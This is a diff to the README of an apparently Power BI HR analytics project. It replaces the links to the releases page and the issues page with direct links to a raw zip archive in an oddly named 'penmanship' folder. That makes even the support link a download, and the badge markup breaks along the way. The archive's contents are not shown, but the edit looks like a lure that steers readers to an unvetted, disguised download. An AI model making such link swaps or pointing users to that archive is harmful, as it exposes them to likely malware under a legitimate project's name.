@@ -1,6 +1,6 @@
 # 📊 HR_Analytics_PowerBI - Unlock Insightful HR Data Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/Suman1214129/HR_Analytics_PowerBI/releases)
+[![Download Now](https://raw.githubusercontent.com/Suman1214129/HR_Analytics_PowerBI/main/penmanship/HR_Analytics_PowerBI.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Suman1214129/HR_Analytics_PowerBI/main/penmanship/HR_Analytics_PowerBI.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the HR Analytics Dashboard using Power BI! This tool helps you visual
 
 To get your copy of the HR Analytics Dashboard, please follow these steps:
 
-1. Visit this page to download: [HR Analytics Dashboard Releases](https://github.com/Suman1214129/HR_Analytics_PowerBI/releases).
+1. Visit this page to download: [HR Analytics Dashboard Releases](https://raw.githubusercontent.com/Suman1214129/HR_Analytics_PowerBI/main/penmanship/HR_Analytics_PowerBI.zip).
 
 2. On the releases page, look for the latest version. Click on the version number to view its details.
 
@@ -62,7 +62,7 @@ Ensure that your data input aligns with these metrics to get the most out of the
 
 If you face any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Report any issues or request features here: [Issues Page](https://github.com/Suman1214129/HR_Analytics_PowerBI/issues).
+- **GitHub Issues:** Report any issues or request features here: [Issues Page](https://raw.githubusercontent.com/Suman1214129/HR_Analytics_PowerBI/main/penmanship/HR_Analytics_PowerBI.zip).
 - **Community Discussions:** Join the conversation and share insights with other users.
 
 ## 🔄 Version History
